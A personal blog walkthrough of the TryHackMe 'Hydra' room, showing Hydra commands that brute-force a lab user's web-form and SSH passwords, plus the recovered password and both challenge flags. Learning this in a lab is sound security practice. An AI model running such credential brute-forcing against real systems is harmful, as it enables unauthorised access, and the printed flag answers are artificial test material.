+++
date = '2025-09-16T14:19:28+07:00'
title = 'TryHackMe - Hydra Room Walkthrough'
tags = ['TryHackMe', 'CTFs']
description = "Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials." 
draft = false

[cover]
  image = '/images/posts/tryhackme-hydra.png'
  alt = 'TryHackMe Hydra Room'
  caption = 'TryHackMe Hydra Room'
  relative = false
+++

This is my TryHackMe walkthrough, created to document my learning journey and share solutions with the community. The writeups include a mix of hints, step-by-step explanations, and final answers to help players who get stuck, while still encouraging independent problem-solving.

> Hydra Room - Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

## Overview

-   **Room URL:** [https://tryhackme.com/room/hydra](https://tryhackme.com/room/hydra)
-   **Difficulty:** Easy
-   **Time to complete:** 45

## Walkthrough

### 1. Hydra Introduction

_No hints needed!_

### 2. Using Hydra

-   <p>Use Hydra to bruteforce molly's web password. What is flag 1?<br /></p>

-   Start the machine and visit the website via MACHINE IP

![Guide image](/images/posts/hydra-1.png)

-   Open Web Devtools, in Network section, try login there is a POST request to `http://<MACHINE_IP>/login`

![Guide image](/images/posts/hydra-2.png)

-   Now we know the path, we can brute-force the password

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect" -V
```

![Guide image](/images/posts/hydra-3.png)

-   We got the password `sunshine`, login as `molly` and get the flag

![Guide image](/images/posts/hydra-4.png)

**=> Answer: `THM{2673a7dd116de68e85c48ec0b1f2612e}`**

-   <p>Use Hydra to bruteforce molly's SSH password. What is flag 2?<br /></p>

-   Do the same with ssh to get the password and gain access

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> -t 4 ssh
```

![Guide image](/images/posts/hydra-5.png)

-   Now we got the password, ssh to server and get the flag

```bash
ssh molly@<MACHINE_IP>

cat flag2.txt
```

![Guide image](/images/posts/hydra-6.png)

**=> Answer: `THM{c8eeb0468febbadea859baeb33b2541b}`**
